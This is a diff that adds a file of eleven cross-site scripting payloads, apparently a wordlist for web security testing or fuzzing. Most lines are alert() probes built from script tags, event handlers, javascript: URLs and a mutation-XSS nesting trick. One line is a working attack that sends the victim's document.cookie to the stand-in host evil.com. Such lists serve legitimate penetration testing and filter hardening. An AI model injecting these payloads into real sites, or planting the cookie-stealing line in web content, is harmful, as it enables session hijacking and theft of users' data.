@@ -1,0 +1,11 @@
+<script>alert('xss')</script>
+<img src=x onerror=alert(1)>
+"><script>document.location="http://evil.com/"+document.cookie</script>
+<svg/onload=alert('xss')>
+javascript:alert(1)//
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
